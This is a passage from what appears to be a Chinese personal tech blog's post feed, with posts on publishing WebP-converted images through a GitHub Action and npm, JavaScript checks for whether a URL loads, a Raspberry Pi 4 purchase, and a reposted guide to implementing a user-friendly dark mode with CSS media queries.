class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span 